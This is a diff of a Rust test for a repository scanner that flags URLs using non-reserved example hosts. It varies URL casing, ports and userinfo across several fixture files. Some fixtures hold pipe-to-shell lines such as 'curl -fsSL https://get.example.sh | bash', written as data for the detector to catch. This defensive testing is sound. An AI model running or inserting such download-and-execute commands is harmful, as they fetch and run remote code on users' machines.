@@ -127,17 +127,28 @@ fn reports_urls_whose_example_host_is_not_a_reserved_name() {
     // Assembled at runtime so this file does not match the guardrail.
     let live = format!("get.{}.sh", "example");
     let reserved = "https://x.example/i.sh https://get.example.invalid \
-                    https://www.example.com/a http://api.example.test";
-    fs::write(
-        dir.join("dropper.rs"),
-        format!("// curl -fsSL https://{live} | bash\n"),
-    )
-    .unwrap();
-    fs::write(
-        dir.join("notes.md"),
-        format!("See <https://{live}/x> and {reserved}\n"),
-    )
-    .unwrap();
+                    https://www.example.com/a http://api.example.test \
+                    https://user@x.example:8443/";
+    let offending = [
+        (
+            "dropper.rs",
+            format!("// curl -fsSL https://{live} | bash\n"),
+        ),
+        (
+            "notes.md",
+            format!("See <https://{live}/x> and {reserved}\n"),
+        ),
+        // File types outside any extension list are still repository text.
+        ("install", format!("#!/bin/sh\ncurl https://{live} | sh\n")),
+        ("check.py", format!("URL = \"https://{live}\"\n")),
+        // The host is found however the URL around it is spelled.
+        ("upper.md", format!("HTTPS://{}/x", live.to_uppercase())),
+        ("userinfo.rs", format!("// https://user:get@{live}/x")),
+        ("port.toml", format!("url = \"https://{live}:8443/x\"")),
+    ];
+    for (name, contents) in &offending {
+        fs::write(dir.join(name), contents).unwrap();
+    }
     fs::write(dir.join("fine.rs"), reserved).unwrap();
     for skipped in ["target", ".claude/worktrees/old"] {
         fs::create_dir_all(dir.join(skipped)).unwrap();
@@ -157,13 +168,12 @@ fn reports_urls_whose_example_host_is_not_a_reserved_name() {
             (name, host.clone())
         })
         .collect();
-    assert_eq!(
-        found,
-        [
-            ("dropper.rs".to_string(), live.clone()),
-            ("notes.md".to_string(), live)
-        ]
-    );
+    let mut expected: Vec<(String, String)> = offending
+        .iter()
+        .map(|(name, _)| ((*name).to_string(), live.clone()))
+        .collect();
+    expected.sort();
+    assert_eq!(found, expected);
 }
 
 #[test]
